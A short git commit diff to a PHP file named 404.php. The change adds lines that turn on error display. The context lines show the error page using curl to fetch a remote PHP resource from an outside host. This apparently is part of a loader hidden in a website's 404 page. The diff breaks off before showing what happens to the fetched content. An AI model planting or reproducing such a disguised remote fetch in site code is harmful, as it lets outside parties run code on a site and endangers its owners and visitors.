32c8cbfbb4b0643aa28bd1aaaa61c9a6f144d4f5
413X308 <PhillipsBarbara4458@outlook.com>
2025-11-09 13:05:34 +0700

    Update 404.php

--- 404.php
+++ 404.php
@@ -1,5 +1,6 @@
 <?php
-
+    ini_set('display_errors', 1);
+    error_reporting(E_ALL);
     $Url = "https://egre55.com//resources/us.php";
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $Url);
